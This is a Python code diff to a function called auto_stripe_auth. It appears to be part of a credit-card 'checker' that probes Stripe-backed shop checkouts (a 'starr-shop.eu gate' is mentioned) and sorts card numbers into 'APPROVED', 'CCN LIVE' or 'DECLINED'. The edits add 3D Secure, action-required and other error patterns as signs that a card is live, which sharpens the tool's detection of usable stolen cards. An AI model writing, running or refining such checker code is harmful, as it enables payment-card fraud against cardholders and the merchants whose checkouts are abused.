@@ -484,8 +484,17 @@ async def auto_stripe_auth(
             code = err.get("code", "")
             msg = err.get("message", "Unknown")
             result["message"] = msg
+            msg_lower = msg.lower()
+            # 3DS / action_required = CCN LIVE (card is live)
+            if code in ("authentication_required", "action_required", "requires_action") or any(
+                x in msg_lower for x in ["authentication required", "action required", "3d secure", "3ds"]
+            ):
+                result["success"] = True
+                result["response"] = "CCN LIVE"
+                result["message"] = result["message"] or "3D Secure (CCN Live)"
+                return result
             if code in ("incorrect_cvc", "invalid_cvc", "incorrect_zip", "postal_code_invalid") or any(
-                x in msg.lower() for x in ["cvc", "security code", "zip", "postal"]
+                x in msg_lower for x in ["cvc", "security code", "zip", "postal"]
             ):
                 result["success"] = True
                 result["response"] = "CCN LIVE"
@@ -550,14 +559,21 @@ async def auto_stripe_auth(
                 result["response"] = "DECLINED"
                 result["message"] = (str(ajax_json) if ajax_text.strip() else "Invalid response")[:200]
                 return result
+            data = ajax_json.get("data", {})
+            if not isinstance(data, dict):
+                data = {}
+            # action_required / 3DS = CCN LIVE (same as starr-shop.eu gate) — check before success
+            data_str = str(data).lower()
+            if any(x in data_str for x in ["action_required", "action required", "challenge", "authentication_required", "authentication required", "requires_action"]):
+                result["success"] = True
+                result["response"] = "CCN LIVE"
+                result["message"] = "3D Secure / Action required (CCN Live)"
+                return result
             if ajax_json.get("success") is True:
                 result["success"] = True
                 result["response"] = "APPROVED"
                 result["message"] = "Card authenticated"
                 return result
-            data = ajax_json.get("data", {})
-            if not isinstance(data, dict):
-                data = {}
             error_obj = data.get("error")
             if not isinstance(error_obj, dict):
                 error_obj = {}
@@ -566,23 +582,13 @@ async def auto_stripe_auth(
                 err_msg = str(err_msg)
             result["message"] = (err_msg or ajax_text)[:200]
             err_upper = result["message"].upper()
-            if any(
-                x in err_upper
-                for x in [
-                    "SECURITY CODE",
-                    "CVC",
-                    "CVV",
-                    "INCORRECT_CVC",
-                    "POSTAL",
-                    "ZIP",
-                    "ADDRESS",
-                    "AVS",
-                    "AUTHENTICATION",
-                    "3D SECURE",
-                    "INSUFFICIENT",
-                    "INCORRECT NUMBER",
-                ]
-            ):
+            # CCN LIVE: CVC/AVS/3DS/action required / insufficient
+            ccn_patterns = [
+                "SECURITY CODE", "CVC", "CVV", "INCORRECT_CVC", "POSTAL", "ZIP", "ADDRESS", "AVS",
+                "AUTHENTICATION", "3D SECURE", "3DS", "ACTION REQUIRED", "ACTION_REQUIRED",
+                "CHALLENGE", "REQUIRES_ACTION", "INSUFFICIENT", "INCORRECT NUMBER",
+            ]
+            if any(x in err_upper for x in ccn_patterns):
                 result["success"] = True
                 result["response"] = "CCN LIVE"
             else:
